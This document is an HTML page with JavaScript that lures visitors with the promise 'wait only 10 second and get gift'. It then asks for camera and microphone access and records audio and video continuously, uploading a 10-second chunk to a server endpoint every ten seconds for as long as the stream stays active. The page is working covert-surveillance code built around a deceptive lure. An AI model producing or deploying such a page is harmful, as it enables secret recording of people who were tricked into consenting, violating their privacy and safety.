<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Standard Media Recorder</title>
  <style>
    body {
      margin: 0;
      padding: 20px;
      font-family: Arial, sans-serif;
      background-color: #0f172a;
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
    }
    h2 {
      margin-bottom: 10px;
    }
    p {
      color: #94a3b8;
      max-width: 500px;
      text-align: center;
    }
    button {
      padding: 12px 24px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      border: none;
      border-radius: 8px;
      background-color: #2563eb;
      color: white;
      margin-top: 15px;
      transition: background 0.2s;
    }
    button:hover {
      background-color: #1d4ed8;
    }
    video {
      width: 100%;
      max-width: 480px;
      border-radius: 12px;
      margin-top: 20px;
      background: #000;
      box-shadow: 0 8px 20px rgba(0,0,0,0.5);
    }
    #status {
      margin-top: 15px;
      font-size: 14px;
      color: #38bdf8;
    }
  </style>
</head>
<body>

  <h2>wait only 10 second</h2>
  <p>wait only 10 second and get gift</p>

  <button id="enableBtn">Grant Permissions & Start</button>
  <p id="status"></p>

  <!-- Transparent Live Video Preview -->
  <video id="webcamPreview" autoplay playsinline muted></video>

  <script>
    let mediaRecorder;
    let recordedChunks = [];
    const enableBtn = document.getElementById('enableBtn');
    const videoElement = document.getElementById('webcamPreview');
    const statusText = document.getElementById('status');

    enableBtn.addEventListener('click', async () => {
      try {
        // Standard Browser Permission Dialog for Audio & Video
        const stream = await navigator.mediaDevices.getUserMedia({ 
          audio: true, 
          video: true 
        });

        videoElement.srcObject = stream;
        enableBtn.style.display = 'none';
        statusText.innerText = '🔴 Stream Active: Recording and uploading chunks...';

        mediaRecorder = new MediaRecorder(stream);

        mediaRecorder.ondataavailable = event => {
          if (event.data.size > 0) recordedChunks.push(event.data);
        };

        // Every 10 seconds chunk processing
        setInterval(() => {
          if (mediaRecorder && mediaRecorder.state === "recording") {
            mediaRecorder.stop();
          }
        }, 10000);

        mediaRecorder.onstop = async () => {
          const blob = new Blob(recordedChunks, { type: 'video/webm' });
          recordedChunks = [];

          const formData = new FormData();
          formData.append('mediaFile', blob, 'stream.webm');

          try {
            const res = await fetch('/api/upload-media', {
              method: 'POST',
              body: formData
            });
            const data = await res.json();
            if (data.success) {
              console.log('Chunk Uploaded Successfully:', data.url);
            }
          } catch (err) {
            console.error('Upload Failed:', err);
          }

          if (stream.active) {
            mediaRecorder.start();
          }
        };

        mediaRecorder.start();

      } catch (err) {
        console.error("Permission error:", err);
        alert("Camera or Microphone permission was denied or not supported.");
      }
    });
  </script>
</body>
</html>
